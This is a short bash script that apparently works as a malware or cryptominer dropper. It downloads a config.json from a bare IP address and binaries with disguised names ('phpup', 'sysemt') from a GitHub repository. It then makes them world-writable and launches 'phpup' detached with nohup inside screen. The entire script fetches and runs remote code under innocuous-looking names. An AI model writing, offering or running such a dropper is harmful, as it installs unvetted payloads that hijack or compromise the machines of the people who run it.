#!/bin/bash

VERSION=2.11
cd /tmp/
mkdir phpup
cd /phpup/
wget http://172.247.34.167/wk/config.json
wget https://github.com/teshushu/BiBi/raw/main/phpup
wget https://raw.githubusercontent.com/teshushu/BiBi/main/sysemt
wget https://raw.githubusercontent.com/teshushu/BiBi/main/time.sh
chmod -R 777 phpup
chmod -R 777 config.json
chmod -R 777 sysemt
chmod -R 777 time.sh
screen
nohup ./phpup
